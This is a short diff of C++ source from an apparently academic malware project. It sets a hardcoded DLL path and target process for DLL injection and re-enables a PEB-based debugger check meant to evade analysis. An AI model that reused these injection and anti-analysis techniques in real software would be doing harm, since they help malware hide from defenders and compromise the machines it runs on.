@@ -5,22 +5,22 @@
 #include <string>
 #include <sstream>
 
+
 // Temporary, the dll location/name and the name of the process to inject into
-const char szDllFile[] = "C:\\Users\\scott\\OneDrive - Southern Alberta Institute of Technology\\SAIT\\ISS_S4\\capstone\\malware\\capstone\\bin\\x64\\Release\\dll.dll";
-const char szProc[]    = "injector.exe";
+const char *szDllFile = "C:\\Users\\scott\\Documents\\GitHub\\sample\\bin\\x64\\Release\\dll.dll";
+const char *szProc    = "injector.exe";
 
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
 {
-    API::APIResolver  init;
+    API::APIResolver  resolver;
     AntiAnalysis      debug;
     Tools             tools;
     PROCESSENTRY32    PE32{0};
     PE32.dwSize =     sizeof(PE32);
 
-    auto api = init.GetAPIAccess();
 
-//    debug.PebCheck(); // Check if being debugged
+    debug.PebCheck(resolver); // Check if being debugged
 
 
     HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); // Create snapshot of processes running
